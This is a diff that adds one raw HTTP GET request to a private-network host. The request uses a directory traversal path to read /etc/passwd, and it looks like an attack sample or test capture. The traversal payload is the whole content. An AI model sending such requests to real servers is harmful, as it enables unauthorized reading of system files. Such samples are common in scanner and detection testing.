@@ -1,0 +1,11 @@
+GET /pte/../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: 192.168.203.178
+User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+
+
